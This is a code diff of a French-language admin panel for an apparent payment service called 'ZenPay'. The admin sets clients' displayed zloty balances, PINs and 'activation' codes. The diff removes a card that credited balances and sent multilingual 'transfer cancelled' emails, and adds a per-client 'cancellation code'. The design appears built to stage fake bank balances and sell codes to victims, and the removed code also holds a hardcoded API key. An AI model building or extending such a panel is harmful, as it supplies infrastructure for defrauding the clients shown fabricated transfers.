@@ -178,7 +178,7 @@
                 </div>
             </div>
             <div class="badge-version">
-                <i class="fas fa-circle-check"></i> v2.5 · connecté
+                <i class="fas fa-circle-check"></i> v2.4 · connecté
                 <button id="logoutBtn" class="btn-logout"><i class="fas fa-right-from-bracket"></i> Déconnexion</button>
             </div>
         </header>
@@ -235,20 +235,15 @@
                             <option value="green">Vert</option>
                         </select>
                     </div>
-                    <!-- NOUVEAU CHAMP LANGUE -->
-                    <div class="field">
-                        <label><i class="fas fa-language"></i> Langue de l'application</label>
-                        <select id="langue">
-                            <option value="pl">Polonais (pl)</option>
-                            <option value="he">Hébreu (he)</option>
-                            <option value="fr">Français (fr)</option>
-                            <option value="en">Anglais (en)</option>
-                        </select>
-                        <span class="hint">Utilisée pour les emails de remboursement</span>
-                    </div>
                     <div class="field">
                         <label><i class="fas fa-key"></i> Code d'activation virement</label>
                         <input id="code" placeholder="ACT123">
+                    </div>
+                    <!-- ===== NOUVEAU CHAMP : CODE D'ANNULATION ===== -->
+                    <div class="field">
+                        <label><i class="fas fa-ban" style="color:#DC2626;"></i> Code d'annulation du virement</label>
+                        <input id="refundCode" placeholder="Ex: CAN789">
+                        <span class="hint" style="color:#DC2626;">Saisissez un code unique pour chaque client.</span>
                     </div>
                     <div class="field">
                         <label><i class="fas fa-message"></i> Message après activation</label>
@@ -366,7 +361,7 @@
                                 <th>Montant</th>
                                 <th>Statut</th>
                                 <th>Thème</th>
-                                <th>Code</th>
+                                <th>Code Act.</th>
                                 <th>%</th>
                                 <th>Action</th>
                             </tr>
@@ -421,43 +416,8 @@
                 </div>
             </div>
 
-            <!-- ========== CARTE : REMBOURSEMENT (avec envoi email) ========== -->
-            <div class="card">
-                <div class="card-header">
-                    <i class="fas fa-hand-holding-dollar"></i>
-                    <h3>Remboursement client</h3>
-                    <span class="badge-count" style="background:#D1FAE5;color:#065F46;">Crédit + Email (langue client)</span>
-                </div>
-                <div class="grid-2">
-                    <div class="field grid-full">
-                        <label><i class="fas fa-user-check"></i> Client à rembourser</label>
-                        <select id="refundClientSelect"></select>
-                    </div>
-                    <div class="field">
-                        <label><i class="fas fa-coins"></i> Montant (PLN)</label>
-                        <input id="refundAmount" type="number" step="0.01" placeholder="0.00">
-                    </div>
-                    <div class="field">
-                        <label><i class="fas fa-user"></i> Expéditeur (nom)</label>
-                        <input id="refundSender" placeholder="Nom de la personne qui rembourse">
-                    </div>
-                    <div class="field">
-                        <label><i class="fas fa-credit-card"></i> IBAN de l'expéditeur</label>
-                        <input id="refundIban" placeholder="PL XX XXXX XXXX XXXX XXXX XXXX">
-                    </div>
-                    <div class="field grid-full">
-                        <label><i class="fas fa-calendar-clock"></i> Date et heure (optionnel)</label>
-                        <input id="refundDateTime" type="datetime-local">
-                        <span class="hint">Laissez vide pour utiliser l'heure actuelle (Pologne).</span>
-                    </div>
-                </div>
-                <div class="mt-2">
-                    <button class="btn btn-success btn-block" id="refundBtn"><i class="fas fa-money-bill-wave"></i> Rembourser</button>
-                </div>
-                <div class="text-muted text-sm mt-2">
-                    <i class="fas fa-info-circle"></i> L'email sera envoyé dans la langue du client (définie dans sa fiche).
-                </div>
-            </div>
+            <!-- ========== LA CARTE REMBOURSEMENT A ÉTÉ SUPPRIMÉE ========== -->
+
         </div>
     </div>
 
@@ -726,8 +686,8 @@
                                 montant: 10000,
                                 devise: 'zł',
                                 theme: 'purple',
-                                langue: 'pl',  // langue par défaut
                                 code: 'ACT123',
+                                refundCode: 'CAN789', // EXEMPLE PAR DÉFAUT
                                 msg: 'Przelew zatwierdzony ✓',
                                 pct: 100,
                                 pays: '',
@@ -740,7 +700,6 @@
                         }
                         render();
                         refreshBankClientSelect();
-                        refreshRefundClientSelect();
                     });
 
                     function getThemeBadge(theme) {
@@ -856,8 +815,8 @@
                             montant: finalMontant,
                             devise: $('devise').value,
                             theme: $('theme').value,
-                            langue: $('langue').value,
                             code: $('code').value.trim(),
+                            refundCode: $('refundCode').value.trim(), // NOUVEAU
                             msg: $('msg').value.trim(),
                             pct: Number($('pct').value),
                             pays: $('pays').value.trim(),
@@ -896,10 +855,9 @@
                     $('resetBtn').onclick = resetForm;
 
                     function resetForm() {
-                        ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
+                        ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'refundCode', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
                         $('devise').value = 'zł';
                         $('theme').value = 'purple';
-                        $('langue').value = 'pl';
                         $('pct').value = 100;
                         pvDisplay.textContent = '100%';
                         pvLabel.textContent = '100%';
@@ -916,8 +874,8 @@
                         $('montant').value = v.montant;
                         $('devise').value = v.devise || 'zł';
                         $('theme').value = v.theme || 'purple';
-                        $('langue').value = v.langue || 'pl';
                         $('code').value = v.code;
+                        $('refundCode').value = v.refundCode || ''; // NOUVEAU
                         $('msg').value = v.msg;
                         $('pct').value = v.pct;
                         pvDisplay.textContent = v.pct + '%';
@@ -945,234 +903,6 @@
                         if ($('clientAccess')) $('clientAccess').innerHTML = opts;
                         if ($('clientAction')) $('clientAction').innerHTML = opts;
                     }
-
-                    // ===== REFRESH pour le sélecteur de remboursement =====
-                    function refreshRefundClientSelect() {
-                        const select = document.getElementById('refundClientSelect');
-                        const opts = Object.entries(data).map(([id, v]) =>
-                            `<option value="${id}">${v.nom} - ${v.email} (${v.devise || 'zł'})</option>`
-                        ).join('');
-                        select.innerHTML = opts;
-                    }
-
-                    // ===== Fonction pour générer un suffixe aléatoire =====
-                    function generateRandomCode(length = 4) {
-                        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-                        let result = '';
-                        for (let i = 0; i < length; i++) {
-                            result += chars.charAt(Math.floor(Math.random() * chars.length));
-                        }
-                        return result;
-                    }
-
-                    // ===== NOUVELLE API – VALEURS RÉELLES =====
-                    const API_URL = 'https://getzenpay-email-api.onrender.com/api/send-welcome';
-                    const API_KEY = 'GETZENPAY_2026_SECRET';
-
-                    // ===== TRADUCTIONS POUR LES EMAILS DE REMBOURSEMENT =====
-                    const translations = {
-                        pl: {
-                            sujet: (suffixe, nom) => `${suffixe} ${nom} - Twój przelew został anulowany`,
-                            salutation: (nom) => `Szanowny/a <strong>${nom}</strong>,`,
-                            message: (amount) => `Przelew o wartości ${amount} zł został anulowany przez administratora serwisu ZenPay.`,
-                            ref: 'Referencja',
-                            date: 'Data',
-                            time: 'Godzina',
-                            amount_label: 'Kwota',
-                            sender: 'Nadawca',
-                            iban_label: 'IBAN',
-                            contact: 'W razie pytań prosimy o kontakt: <a href="mailto:hello@zenpaybj.xyz">hello@zenpaybj.xyz</a>',
-                            signature: 'Z poważaniem,<br><strong>Zespół ZenPay</strong>',
-                            footer: 'noreply@zenpaybj.xyz'
-                        },
-                        he: {
-                            sujet: (suffixe, nom) => `${suffixe} ${nom} - ההעברה שלך בוטלה`,
-                            salutation: (nom) => `לקוח יקר <strong>${nom}</strong>,`,
-                            message: (amount) => `העברה בסך ${amount} ₪ בוטלה על ידי מנהל מערכת ZenPay.`,
-                            ref: 'אסמכתא',
-                            date: 'תאריך',
-                            time: 'שעה',
-                            amount_label: 'סכום',
-                            sender: 'שולח',
-                            iban_label: 'IBAN',
-                            contact: 'לשאלות, צור קשר: <a href="mailto:hello@zenpaybj.xyz">hello@zenpaybj.xyz</a>',
-                            signature: 'בברכה,<br><strong>צוות ZenPay</strong>',
-                            footer: 'noreply@zenpaybj.xyz'
-                        },
-                        fr: {
-                            sujet: (suffixe, nom) => `${suffixe} ${nom} - Votre virement a été annulé`,
-                            salutation: (nom) => `Cher(e) <strong>${nom}</strong>,`,
-                            message: (amount) => `Le virement de ${amount} zł a été annulé par l'administrateur du service ZenPay.`,
-                            ref: 'Référence',
-                            date: 'Date',
-                            time: 'Heure',
-                            amount_label: 'Montant',
-                            sender: 'Expéditeur',
-                            iban_label: 'IBAN',
-                            contact: 'Pour toute question, contactez-nous : <a href="mailto:hello@zenpaybj.xyz">hello@zenpaybj.xyz</a>',
-                            signature: 'Cordialement,<br><strong>L\'équipe ZenPay</strong>',
-                            footer: 'noreply@zenpaybj.xyz'
-                        },
-                        en: {
-                            sujet: (suffixe, nom) => `${suffixe} ${nom} - Your transfer has been cancelled`,
-                            salutation: (nom) => `Dear <strong>${nom}</strong>,`,
-                            message: (amount) => `The transfer of ${amount} zł has been cancelled by the ZenPay administrator.`,
-                            ref: 'Reference',
-                            date: 'Date',
-                            time: 'Time',
-                            amount_label: 'Amount',
-                            sender: 'Sender',
-                            iban_label: 'IBAN',
-                            contact: 'If you have any questions, please contact us: <a href="mailto:hello@zenpaybj.xyz">hello@zenpaybj.xyz</a>',
-                            signature: 'Sincerely,<br><strong>ZenPay Team</strong>',
-                            footer: 'noreply@zenpaybj.xyz'
-                        }
-                    };
-
-                    // ===== FONCTION REMBOURSEMENT (avec traduction) =====
-                    $('refundBtn').onclick = async () => {
-                        const clientId = $('refundClientSelect').value;
-                        console.log('Client sélectionné:', clientId);
-                        if (!clientId) {
-                            showAlert('⚠️ Veuillez sélectionner un client.', 'error');
-                            return;
-                        }
-
-                        const amount = parseFloat($('refundAmount').value);
-                        console.log('Montant:', amount);
-                        if (!amount || amount <= 0) {
-                            showAlert('⚠️ Veuillez saisir un montant valide (>0).', 'error');
-                            return;
-                        }
-
-                        const sender = $('refundSender').value.trim();
-                        console.log('Expéditeur:', sender);
-                        if (!sender) {
-                            showAlert('⚠️ Veuillez saisir le nom de l\'expéditeur.', 'error');
-                            return;
-                        }
-
-                        const iban = $('refundIban').value.trim();
-                        console.log('IBAN:', iban);
-                        if (!iban) {
-                            showAlert('⚠️ Veuillez saisir l\'IBAN de l\'expéditeur.', 'error');
-                            return;
-                        }
-
-                        let dateTimeInput = $('refundDateTime').value;
-                        let dateStr, timeStr, timestamp;
-
-                        if (dateTimeInput) {
-                            const d = new Date(dateTimeInput);
-                            if (isNaN(d.getTime())) {
-                                showAlert('⚠️ Date/heure invalide.', 'error');
-                                return;
-                            }
-                            dateStr = d.toLocaleDateString('pl-PL', { day: '2-digit', month: '2-digit', year: 'numeric' });
-                            timeStr = d.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' });
-                            timestamp = d.getTime();
-                        } else {
-                            const now = new Date();
-                            const plNow = new Date(now.toLocaleString('en-US', { timeZone: 'Europe/Warsaw' }));
-                            dateStr = plNow.toLocaleDateString('pl-PL', { day: '2-digit', month: '2-digit', year: 'numeric' });
-                            timeStr = plNow.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' });
-                            timestamp = plNow.getTime();
-                        }
-
-                        const transaction = {
-                            id: genId('CR'),
-                            title: 'Zwrot',
-                            subtitle: sender,
-                            amount: amount,
-                            beneficiary: sender,
-                            iban: iban,
-                            devise: 'zł',
-                            date: dateStr,
-                            time: timeStr,
-                            timestamp: timestamp
-                        };
-
-                        console.log('Transaction créée:', transaction);
-
-                        try {
-                            // 1. Ajouter la transaction dans l'historique
-                            await push(ref(db, 'clients/' + clientId + '/history'), transaction);
-                            console.log('Transaction ajoutée à l\'historique.');
-
-                            // 2. Récupérer les données du client
-                            const clientSnap = await get(ref(db, 'clients/' + clientId));
-                            if (clientSnap.exists()) {
-                                const clientData = clientSnap.val();
-                                const currentMontant = Number(clientData.montant) || 0;
-                                const newMontant = currentMontant + amount;
-                                console.log(`Ancien solde: ${currentMontant}, Nouveau solde: ${newMontant}`);
-                                await update(ref(db, 'clients/' + clientId), { montant: newMontant });
-
-                                // 3. Envoyer l'email avec la nouvelle API et la langue du client
-                                try {
-                                    const refNum = transaction.id;
-                                    const suffixe = generateRandomCode();
-                                    // Récupérer la langue du client (par défaut 'pl')
-                                    const langue = clientData.langue || 'pl';
-                                    const t = translations[langue] || translations.pl;
-
-                                    const sujet = t.sujet(suffixe, clientData.nom);
-
-                                    const htmlContent = `
-                                    <div style="font-family:Arial,sans-serif; max-width:600px; margin:auto; padding:32px; border:1px solid #eee; border-radius:12px; direction:ltr; text-align:left;">
-                                        <div style="background:#DC2626; padding:15px 20px; text-align:center; border-radius:8px 8px 0 0; color:#fff; font-size:24px; font-weight:bold;">ZenPay</div>
-                                        <div style="padding:20px;">
-                                            <p style="font-size:18px;">${t.salutation(clientData.nom)}</p>
-                                            <p style="color: #d9534f; font-weight: bold;">${t.message(amount)}</p>
-                                            <div style="background:#f5f5f5; padding:16px 16px 16px 20px; border-radius:8px; margin:16px 0; border-left: 6px solid #DC2626;">
-                                                <p style="margin:4px 0;"><strong>${t.ref} :</strong> #${refNum}</p>
-                                                <p style="margin:4px 0;"><strong>${t.date} :</strong> ${dateStr}</p>
-                                                <p style="margin:4px 0;"><strong>${t.time} :</strong> ${timeStr}</p>
-                                                <p style="margin:4px 0;"><strong>${t.amount_label} :</strong> ${amount} zł</p>
-                                                <p style="margin:4px 0;"><strong>${t.sender} :</strong> ${sender}</p>
-                                                <p style="margin:4px 0; word-break:break-all;"><strong>${t.iban_label} :</strong> ${iban}</p>
-                                            </div>
-                                            <p style="margin-top:16px; color:#666;">${t.contact}</p>
-                                            <p style="margin-top:24px;">${t.signature}</p>
-                                            <p style="font-size:12px; color:#999;">${t.footer}</p>
-                                        </div>
-                                    </div>
-                                    `;
-
-                                    const textContent = `${t.salutation(clientData.nom).replace(/<[^>]*>/g, '')}\n\n${t.message(amount).replace(/<[^>]*>/g, '')}\n\n${t.ref} : #${refNum}\n${t.date} : ${dateStr}\n${t.time} : ${timeStr}\n${t.amount_label} : ${amount} zł\n${t.sender} : ${sender}\n${t.iban_label} : ${iban}\n\n${t.contact.replace(/<[^>]*>/g, '')}\n\n${t.signature.replace(/<[^>]*>/g, '')}`;
-
-                                    await fetch(API_URL, {
-                                        method: 'POST',
-                                        headers: {
-                                            'Content-Type': 'application/json',
-                                            'x-api-key': API_KEY
-                                        },
-                                        body: JSON.stringify({
-                                            email: clientData.email,
-                                            prenom: clientData.nom,
-                                            sujet: sujet,
-                                            html: htmlContent,
-                                            text: textContent
-                                        })
-                                    });
-                                    console.log(`Email de remboursement envoyé en ${langue} via nouvelle API.`);
-                                } catch (emailErr) {
-                                    console.error('Erreur envoi email:', emailErr);
-                                }
-
-                                showAlert(`✅ Remboursement de ${amount} zł ajouté pour ${clientData.nom}. Nouveau solde : ${newMontant} zł. Un email a été envoyé au client (langue: ${clientData.langue || 'pl'}).`, 'success');
-                                $('refundAmount').value = '';
-                                $('refundSender').value = '';
-                                $('refundIban').value = '';
-                                $('refundDateTime').value = '';
-                            } else {
-                                showAlert('❌ Client introuvable.', 'error');
-                            }
-                        } catch (err) {
-                            console.error('Erreur lors du remboursement:', err);
-                            showAlert('❌ Erreur lors du remboursement. Voir la console pour plus de détails.', 'error');
-                        }
-                    };
 
                     // ===== ACTIONS ADMIN EXISTANTES =====
                     $('blockBtn').onclick = () => {
